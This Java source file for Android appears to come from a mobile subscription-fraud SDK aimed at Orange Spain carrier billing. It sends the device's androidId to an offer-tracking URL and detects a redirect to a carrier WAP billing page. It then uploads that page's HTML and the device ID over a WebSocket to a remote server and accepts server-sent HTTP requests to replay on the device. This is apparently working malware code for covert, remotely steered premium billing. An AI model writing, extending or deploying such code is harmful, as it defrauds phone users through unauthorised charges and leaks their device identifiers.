package com.enhtmv.sublib.work.spain;

import android.util.ArrayMap;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.LogUtils;
import com.cp.plugin.http.HttpReqest;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.sub.SubCall;

import java.util.HashMap;
import java.util.Map;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class SpainOrange extends SubCall {


    private Map<String, String> header = new HashMap<>();


    public SpainOrange() {

        header.put("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3329.0 Mobile Safari/537.36");

    }


    @Override
    public void sub(String text) {


        final Info info = parseInfo(text);

        if (info != null) {

            OkHttpClient client = new OkHttpClient.Builder().build();

            //ws://10.0.2.2:8010/ws
            final Request request = new Request.Builder().url(info.getSocket()).build();

            client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    super.onOpen(webSocket, response);

                    LogUtils.i("websocket open !");

                    report(SUB_REQEUST);

                    try {

                        //http://offer.allcpx.com/offer/track?offer=271&clickId=
                        SubResponse s = http().get(info.getSubUrl() + androidId, header);

                        if (s.response().code() == 200 && s.url().startsWith("http://enabler.dvbs.com/session/cardm/wap")) {

                            Map<String, String> data = new ArrayMap<>();

                            data.put("location", s.url());
                            data.put("html", s.body());
                            data.put("vid", androidId);

                            webSocket.send(JSON.toJSONString(data));

                            report("step1", s.url());

                        } else {
                            throw new Exception(s.toString());
                        }

                    } catch (Exception e) {
                        LogUtils.e(e);

                        r.e("step1_error", e);
                    }

                }


                private int num = 1;

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    super.onMessage(webSocket, text);


                    num++;

                    try {
                        HttpReqest httpReqest = JSON.parseObject(text, HttpReqest.class);

                        httpReqest.setHttp(http());

//                        SubResponse response = httpReqest.call();
//
//                        if (response.url().startsWith("https://www.google.com")) {
//
//                            r.w("step" + num, response.flowUrls());
//                            return;
//                        }
//
//                        report("step" + num, response.toString());

                    } catch (Exception e) {
                        LogUtils.e(e);
                        r.e("step" + num + "_error", e);
                    }

                }


                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    super.onFailure(webSocket, t, response);

                    LogUtils.e("websocket error", t);

                    r.e("websokect_error", t);

                }
            });

        }
    }
}
